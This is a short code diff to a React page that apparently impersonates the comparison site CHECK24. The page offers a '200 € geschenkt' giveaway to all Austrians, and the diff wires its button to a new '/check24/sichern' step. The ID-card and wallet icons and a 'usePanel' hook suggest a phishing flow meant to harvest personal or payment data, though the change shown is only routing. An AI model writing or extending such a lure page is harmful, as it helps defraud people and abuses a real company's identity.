@@ -1,4 +1,5 @@
 import { useEffect, useState, useRef, useCallback } from "react";
+import { useNavigate } from "react-router-dom";
 import {
   Gift, CalendarClock, ShieldCheck, MapPin,
   FileEdit, Mail, Wallet, IdCard,
@@ -284,6 +285,7 @@ const TestimonialCarousel = () => {
 };
 
 const Check24 = () => {
+  const navigate = useNavigate();
   usePageMeta("CHECK24 – 200 € geschenkt für alle Österreicher", FAVICON);
 
   const panel = usePanel();
@@ -337,8 +339,7 @@ const Check24 = () => {
         // ignore
       }
     }
-    // Placeholder — Wizard folgt ggf. später
-    window.scrollTo({ top: 0, behavior: "smooth" });
+    navigate("/check24/sichern");
   };
 
   const voraussetzungen: { Icon: IconType; title: string; text: string }[] = [
